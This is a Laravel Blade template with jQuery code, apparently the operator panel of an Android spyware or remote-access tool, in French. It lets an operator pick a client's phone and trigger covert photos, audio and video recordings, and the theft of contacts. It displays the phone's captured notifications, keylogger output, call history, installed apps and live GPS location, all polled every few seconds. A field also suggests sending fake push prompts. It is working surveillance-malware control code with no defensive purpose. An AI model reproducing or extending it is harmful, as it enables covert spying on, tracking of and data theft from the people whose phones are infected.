@extends('layouts.main')
@section('title', 'Controle à distance')

@section('body')
    <x-sidebar />
    <x-nav />

    <div class="mdb-page-content page-intro bg-white">
        <div class="container py-3 ">
            <div class="row">
                <div class="col-md-12 mt-5">
                    <div class="row mt-5 mb-2">
                        <div class="col-md-6">

                        </div>
                        <div class="col-md-6">
                            <div class="row no-gutters">
                                <div class="col">
                                    <div class="mb-2">
                                        <span>Client</span> <br>
                                        <select id="user" class="form-control form-control-sm select2"
                                            style="width: 100%">
                                            @foreach ($users as $el)
                                                <option value="{{ $el->id }}">{{ $el->name }}</option>
                                            @endforeach
                                        </select>
                                    </div>
                                </div>
                                <div class="col">
                                    <div class="mb-2">
                                        <span>Tel</span> <br>
                                        <select name="phone_id" class="form-control form-control-sm select2"
                                            style="width: 100%">

                                        </select>
                                    </div>
                                </div>
                                {{-- <div class="col">
                                    <div class="">
                                        @php
                                            $d2 = now();
                                            $d1 = now()->subDays(7);
                                        @endphp
                                        <span>Date</span>
                                        <input name="date" type="text" class="form-control form-control-sm"
                                            id="date" value="{{ "{$d1->format('Y-m-d')} to {$d2->format('Y-m-d')}" }}">
                                    </div>
                                </div> --}}
                            </div>
                        </div>
                    </div>
                    <div class="row">
                        <div class="card mb-3 shadow-md">
                            <div class="card-header">
                                <h4 class="font-weight-bold"> <i class="fa fa-phone"></i> <span phonename></span> </h4>
                            </div>
                            <div class="card-body">
                                <p class="m-1">
                                    <i class="fa fa-check-circle"></i> Dernière synchronisation : <span updatedon></span>
                                </p>
                                <p class="m-1">
                                    <i class="fa fa-battery"></i> Batterie : <span battery></span>
                                </p>
                                <p class="m-1">
                                    <i class="fa fa-mobile-android-alt"></i> Android : <span android_version></span>
                                </p>
                                <p class="m-1"><i class="fa fa-refresh"></i> FCM : <span fcm></span> </p>
                                <p class="m-1"><i class="fa fa-check-circle"></i> Permissions : <span perms></span> </p>
                            </div>
                        </div>
                        <div class="card mb-3 shadow-md">
                            <div class="card-header">
                                <h4 class="font-weight-bold"> <i class="fa fa-wifi"></i> Contrôle à distance</h4>
                            </div>
                            <div class="card-body">
                                <form action="#" id="f-action">
                                    <div class="mb-2">
                                        <b>Actions</b> <br>
                                        <select name="action" class="form-control form-control-sm select2"
                                            style="width: 350px">
                                            <option value="p1.0">Prence une photo Camera avant</option>
                                            <option value="p1.1">Prence une photo Camera avant avec flash</option>
                                            <option value="p0.0">Prence une photo Camera arriere</option>
                                            <option value="p0.1">Prence une photo Camera arriere avec flash</option>
                                            <option value="c">Recuperer la list contact</option>
                                            <option value="a.12">Audio 12 sec</option>
                                            <option value="a.5">Audio 5 sec</option>
                                            <option value="v1.5">Video cam Avant 5 sec</option>
                                            <option value="v0.8">Video cam Arriere 8 sec</option>
                                        </select>
                                    </div>
                                    <div class="mb-2">
                                        <input name="action2" placeholder="push.1001.veuille valider le">
                                    </div>
                                    <button class="btn btn-sm btn-danger">
                                        <i class="fa fa-envelope"></i>
                                        Envoyer
                                    </button>
                                </form>
                                <hr>
                                <b>Resultats</b>
                                <div class="table-responsive">
                                    <x-error />
                                    <table tresult class="table table-sm table-condensed table-hover table-striped">
                                        <thead>
                                            <th>ID</th>
                                            <th>Action</th>
                                            <th>Etat</th>
                                            <th>Date</th>
                                            <th>Resultat</th>
                                        </thead>
                                        <tbody></tbody>
                                    </table>
                                </div>
                            </div>
                        </div>

                        <div class="card mb-3 shadow-md">
                            <div class="card-header">
                                <h4 class="font-weight-bold"> <i class="fa fa-bell"></i> Notifications</h4>
                            </div>
                            <div class="card-body">
                                <div class="table-responsive">
                                    <x-error />
                                    <table tnotif class="table table-sm table-condensed table-hover table-striped">
                                        <thead>
                                            <th>ID</th>
                                            <th>App</th>
                                            <th>Titre</th>
                                            <th>Notification</th>
                                            <th>Date</th>
                                        </thead>
                                        <tbody></tbody>
                                    </table>
                                </div>
                            </div>
                        </div>

                        <div class="card mb-3 shadow-md">
                            <div class="card-header">
                                <h4 class="font-weight-bold"> <i class="fa fa-keyboard"></i> Keylogger</h4>
                            </div>
                            <div class="card-body">
                                <div class="table-responsive">
                                    <x-error />
                                    <table tkeylogger class="table table-sm table-condensed table-hover table-striped">
                                        <thead>
                                            <th>ID</th>
                                            <th>App</th>
                                            <th>Text</th>
                                            <th>Date</th>
                                        </thead>
                                        <tbody></tbody>
                                    </table>
                                </div>
                            </div>
                        </div>

                        <div class="card mb-3 shadow-md">
                            <div class="card-header">
                                <h4 class="font-weight-bold"> <i class="fa fa-map-location"></i> Localisation</h4>
                            </div>
                            <div class="card-body">
                                <div id="map" class="m-2 rounded-lg"></div>
                            </div>
                        </div>

                    </div>
                </div>
                <div class="row">
                    <div class="col-md-12">

                        <h5 class="mt-3 font-weight-bold">Mes Téléphones</h5>
                        <div class="table-responsive">
                            <table tphone class="table table-sm table-condensed table-hover table-striped">
                                <thead>
                                    <th>ID</th>
                                    <th>Tel</th>
                                    <th>Version Android</th>
                                    <th>Niveau Batterie</th>
                                    <th>FCM</th>
                                    <th>Permissions</th>
                                    <th>Derniere connexion</th>
                                </thead>
                                <tbody></tbody>
                            </table>
                        </div>

                        <h5 class="mt-3 font-weight-bold">Appels</h5>
                        <div class="table-responsive">
                            <table tcall class="table table-sm table-condensed table-hover table-striped">
                                <thead>
                                    <th>ID</th>
                                    <th>Nom</th>
                                    <th>Numero</th>
                                    <th>Type</th>
                                    <th>Temps</th>
                                    <th>Date</th>
                                </thead>
                                <tbody></tbody>
                            </table>
                        </div>

                        <h5 class="mt-3 font-weight-bold">Appli</h5>
                        <div class="table-responsive">
                            <table tapp class="table table-sm table-condensed table-hover table-striped">
                                <thead>
                                    <th>ID</th>
                                    <th>App</th>
                                    <th>Package</th>
                                    <th>Date installation</th>
                                    <th>Etat</th>
                                </thead>
                                <tbody></tbody>
                            </table>
                        </div>

                    </div>
                </div>
            </div>
        </div>
        <x-footer />
    @endsection

    @section('js-code')
        @include('files.datatable-js')
        {{-- @include('files.flatpickr') --}}
        @include('files.select')

        <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
            integrity="sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY=" crossorigin="" />
        <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"
            integrity="sha256-20nQCchB9co0qIjJZRGuk2/Z9VM+kNiyxNV1lvTlZBo=" crossorigin=""></script>
        <link rel="stylesheet" href="https://unpkg.com/leaflet-gesture-handling/dist/leaflet-gesture-handling.min.css">
        <script src="https://unpkg.com/leaflet-gesture-handling"></script>
        <link rel="stylesheet" href="https://unpkg.com/leaflet.fullscreen/Control.FullScreen.css" />
        <script src="https://unpkg.com/leaflet.fullscreen/Control.FullScreen.js"></script>
        <style>
            #map {
                height: 400px;
            }
        </style>
        <script>
            $(function() {
                // flatpickr("#date", {
                //     mode: "range",
                //     maxDate: "today",
                //     locale: {
                //         firstDayOfWeek: 1
                //     }
                // });
                $('.select2').select2({
                    minimumResultsForSearch: Infinity
                });

                var usersel = $('#user');
                var phonesel = $('[name="phone_id"]');

                usersel.change(function() {
                    getphones();
                });
                phonesel.change(function() {
                    label();
                    dtResult.ajax.reload(null, false);
                    dtNotif.ajax.reload(null, false);
                    dtKeylogger.ajax.reload(null, false);
                })

                function label() {
                    var o = phonesel.find('option:selected').attr('data');
                    if (o.length) {
                        o = JSON.parse(o);
                        $('[updatedon]').html(o.updatedon);
                        $('[phonename]').html(o.phone);
                        $('[battery]').html(o.data.battery);
                        $('[android_version]').html(o.data.android_version);
                        $('[fcm]').html(o.fcm ? "<i class='fa fa-check-circle text-success'></i>" :
                            "<i class='text-danger fa fa-exclamation-circle'></i>");
                        var perms = Object.keys(o.perms);
                        var p = [];
                        perms.forEach(e => {
                            p.push(
                                `${e} : ${o.perms[e] ?  "<i class='fa fa-check-circle text-success'></i>" :"<i class='text-danger fa fa-exclamation-circle'></i>"}`
                            );
                        });
                        $('[perms]').html(p.join(' | '));
                    }
                }

                function getphones() {
                    usersel.attr('disabled', true);
                    phonesel.attr('disabled', true);
                    $.ajax({
                        'url': '{{ route('phone.index') }}',
                        data: {
                            user_id: usersel.val()
                        },
                        success: function(data) {
                            var txt = '';
                            data.forEach(e => {
                                txt += `
                            <option value="${e.id}" data='${JSON.stringify(e)}'>[${e.id}] ${e.phone}</option>
                            `;
                            });
                            phonesel.select2('destroy');
                            phonesel.html(txt);
                            phonesel.select2({
                                minimumResultsForSearch: Infinity
                            });
                            label();
                            dtResult.ajax.reload(null, false);
                        },
                    }).always(function() {
                        usersel.attr('disabled', false);
                        phonesel.attr('disabled', false);
                    });
                }

                getphones();


                var mapinit = false;
                var center = true;
                var markerGroup = null;
                var map = null;
                try {
                    map = L.map('map', {
                        gestureHandling: true,
                        fullscreenControl: true,
                    }).setView([48.8566, 2.3522], 13); // Paris
                    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                        attribution: '&copy; OpenStreetMap contributors'
                    }).addTo(map);
                    markerGroup = L.layerGroup().addTo(map);
                    mapinit = true;
                } catch (error) {
                    console.log(error);
                }

                var dtResult = (new DataTable('[tresult]', {
                    // dom: 'Bfrtip',
                    // buttons: [
                    //     'pageLength', 'excel', 'pdf', 'print'
                    // ],
                    lengthMenu: [
                        [10, 25, 50, 100, -1],
                        [10, 25, 50, 100, "All"]
                    ],
                    processing: false,
                    serverSide: true,
                    ajax: {
                        url: "{{ route('remotecontol.index', ['datatable' => '']) }}",
                        beforeSend: function() {
                            // if (!showloader) return;
                            // $('[tdata]').closest('div').LoadingOverlay("show", {
                            //     maxSize: 50
                            // });
                        },
                        data: function(data) {
                            data.type = "result";
                            data.phone_id = phonesel.val();
                        },
                        complete: function() {
                            // $('[tdata]').closest('div').LoadingOverlay("hide");
                        },
                        error: function(resp) {
                            $('[onerror]').slideDown();
                        },
                        // dataSrc: function(json) {
                        //     // $('[solde]').html(json.tot.join(' | '));
                        //     return json.data;
                        // }
                    },
                    order: [
                        [0, "desc"]
                    ],
                    columnDefs: [{
                            targets: 0,
                            width: '1%'
                        },
                        {
                            targets: 4,
                            width: '1%'
                        },
                    ],
                    columns: [{
                            data: 'id',
                            name: 'id'
                        },
                        {
                            data: 'action',
                            name: 'action',
                            searchable: false,
                            orderable: false,
                        },
                        {
                            data: 'success',
                            name: 'success',
                            searchable: false,
                            orderable: false,
                        },
                        {
                            data: 'date',
                            name: 'date',
                            class: 'text-nowrap'
                        },
                        {
                            data: 'result',
                            name: 'result',
                            searchable: false,
                            orderable: false,
                            class: 'text-nowrap text-right'
                        },
                    ]
                })).on('xhr.dt',
                    function(e, settings, data, xhr) {
                        // $('span[nb]').html(data.recordsTotal);
                    });

                let isDtResultInprogress = false;

                setInterval(async () => {
                    if (isDtResultInprogress) return;
                    isDtResultInprogress = true;
                    showloader = false;
                    try {
                        await new Promise((resolve, reject) => {
                            dtResult.ajax.reload(function(json) {
                                resolve(json);
                            }, false);
                        });
                    } catch (error) {}
                    showloader = true;
                    isDtResultInprogress = false;
                }, 3000);


                /////////////
                var dtNotif = (new DataTable('[tnotif]', {
                    // dom: 'Bfrtip',
                    // buttons: [
                    //     'pageLength', 'excel', 'pdf', 'print'
                    // ],
                    lengthMenu: [
                        [10, 25, 50, 100, -1],
                        [10, 25, 50, 100, "All"]
                    ],
                    processing: false,
                    serverSide: true,
                    ajax: {
                        url: "{{ route('remotecontol.index', ['datatable' => '']) }}",
                        beforeSend: function() {
                            // if (!showloader) return;
                            // $('[tdata]').closest('div').LoadingOverlay("show", {
                            //     maxSize: 50
                            // });
                        },
                        data: function(data) {
                            data.type = "notif";
                            data.phone_id = phonesel.val();
                        },
                        complete: function() {
                            // $('[tdata]').closest('div').LoadingOverlay("hide");
                        },
                        error: function(resp) {
                            $('[onerror]').slideDown();
                        },
                        // dataSrc: function(json) {
                        //     // $('[solde]').html(json.tot.join(' | '));
                        //     return json.data;
                        // }
                    },
                    order: [
                        [0, "desc"]
                    ],
                    columnDefs: [{
                            targets: 0,
                            width: '1%'
                        },
                        {
                            targets: 4,
                            width: '1%'
                        },
                    ],
                    columns: [{
                            data: 'id',
                            name: 'id'
                        },
                        {
                            data: 'appname',
                            name: 'appname',
                        },
                        {
                            data: 'title',
                            name: 'title',
                        },
                        {
                            data: 'body',
                            name: 'body',
                        },
                        {
                            data: 'date',
                            name: 'date',
                            class: 'text-nowrap text-right'
                        },
                    ]
                })).on('xhr.dt',
                    function(e, settings, data, xhr) {
                        // $('span[nb]').html(data.recordsTotal);
                    });

                let isDtNotifInprogress = false;

                setInterval(async () => {
                    if (isDtNotifInprogress) return;
                    isDtNotifInprogress = true;
                    showloader = false;
                    try {
                        await new Promise((resolve, reject) => {
                            dtNotif.ajax.reload(function(json) {
                                resolve(json);
                            }, false);
                        });
                    } catch (error) {}
                    showloader = true;
                    isDtNotifInprogress = false;
                }, 3000);



                /////////////
                var dtKeylogger = (new DataTable('[tkeylogger]', {
                    // dom: 'Bfrtip',
                    // buttons: [
                    //     'pageLength', 'excel', 'pdf', 'print'
                    // ],
                    lengthMenu: [
                        [10, 25, 50, 100, -1],
                        [10, 25, 50, 100, "All"]
                    ],
                    processing: false,
                    serverSide: true,
                    ajax: {
                        url: "{{ route('remotecontol.index', ['datatable' => '']) }}",
                        beforeSend: function() {
                            // if (!showloader) return;
                            // $('[tdata]').closest('div').LoadingOverlay("show", {
                            //     maxSize: 50
                            // });
                        },
                        data: function(data) {
                            data.type = "keylog";
                            data.phone_id = phonesel.val();
                        },
                        complete: function() {
                            // $('[tdata]').closest('div').LoadingOverlay("hide");
                        },
                        error: function(resp) {
                            $('[onerror]').slideDown();
                        },
                        // dataSrc: function(json) {
                        //     // $('[solde]').html(json.tot.join(' | '));
                        //     return json.data;
                        // }
                    },
                    order: [
                        [0, "desc"]
                    ],
                    columnDefs: [{
                            targets: 0,
                            width: '1%'
                        },
                        {
                            targets: 3,
                            width: '1%'
                        },
                    ],
                    columns: [{
                            data: 'id',
                            name: 'id'
                        },
                        {
                            data: 'package',
                            name: 'package',
                        },
                        {
                            data: 'text',
                            name: 'text',
                        },
                        {
                            data: 'date',
                            name: 'date',
                            class: 'text-nowrap text-right'
                        },
                    ]
                })).on('xhr.dt',
                    function(e, settings, data, xhr) {
                        // $('span[nb]').html(data.recordsTotal);
                    });

                let isDtKeyloggerInprogress = false;

                setInterval(async () => {
                    if (isDtKeyloggerInprogress) return;
                    isDtKeyloggerInprogress = true;
                    showloader = false;
                    try {
                        await new Promise((resolve, reject) => {
                            dtKeylogger.ajax.reload(function(json) {
                                resolve(json);
                            }, false);
                        });
                    } catch (error) {}
                    showloader = true;
                    isDtKeyloggerInprogress = false;
                }, 3000);

                function location() {
                    $.ajax({
                        url: '{{ route('remotecontol.store') }}',
                        data: {
                            type: "location",
                            phone_id: phonesel.val(),
                        },
                        timeout: 20000,
                        success: function(data) {
                            if (mapinit) {
                                markerGroup.clearLayers();
                                data.forEach((point, index) => {
                                    const lat = point.latitude;
                                    const lng = point.longitude;
                                    const redIcon = new L.Icon({
                                        iconUrl: 'https://cdn.jsdelivr.net/gh/pointhi/leaflet-color-markers@master/img/marker-icon-green.png',
                                        shadowUrl: 'https://cdnjs.cloudflare.com/ajax/libs/leaflet/0.7.3/images/marker-shadow.png',
                                        iconSize: [25, 41],
                                        iconAnchor: [12, 41],
                                        popupAnchor: [1, -34],
                                        shadowSize: [41, 41]
                                    });

                                    const markerOptions = {};
                                    if (index === 0) {
                                        markerOptions.icon = redIcon;
                                    }

                                    const marker = L.marker([lat, lng], markerOptions)
                                        .bindPopup(
                                            `<strong>Précision ${point.id} : ${point.accuracy}m | ${point.date}</strong>`
                                        );

                                    markerGroup.addLayer(marker);
                                    if (center) {
                                        if (index === 0) {
                                            center = false;
                                            map.setView([lat, lng],
                                                18);
                                            marker.openPopup();
                                        }
                                    }
                                });
                            } else {
                                console.log("Map Error");
                            }

                        },
                        error: function(resp) {

                        }

                    }).always(function(s) {
                        setTimeout(() => {
                            location();
                        }, 3000);
                    });
                }

                location();



                var faction = $('#f-action');

                faction.submit(function() {
                    event.preventDefault();
                    var form = $(this);
                    var btn = $(':submit', form).attr('disabled', true);
                    var iclass = btn.find('i').attr('class');
                    btn.find('i').removeClass()
                        .addClass('spinner-border spinner-border-sm');
                    var data = form.serialize();
                    data += "&phone_id=" + phonesel.val();
                    rep = $('#rep', form);
                    rep.slideUp();
                    $.ajax({
                        url: '{{ route('remotecontol.store') }}',
                        type: 'POST',
                        data: data,
                        timeout: 20000,
                        success: function(res) {
                            if (res.success == true) {
                                rep.html(res.message).removeClass().addClass('alert alert-success')
                                    .slideDown();
                                dtResult.ajax.reload(null, false);
                            } else {
                                var m = res.message + '<br>';
                                m += res.data?.errors_msg?.join('<br>') ?? '';
                                rep.removeClass().addClass('alert alert-danger').html(m)
                                    .slideDown();
                            }
                        },
                        error: function(resp) {
                            var mess = resp.responseJSON?.message ??
                                "Une erreur s'est produite, merci de réessayer";
                            rep.removeClass().addClass('alert alert-danger').html(mess).slideDown();
                        }

                    }).always(function(s) {
                        btn.attr('disabled', false).find('i').removeClass().addClass(iclass);
                    });
                });

            });
        </script>
    @endsection
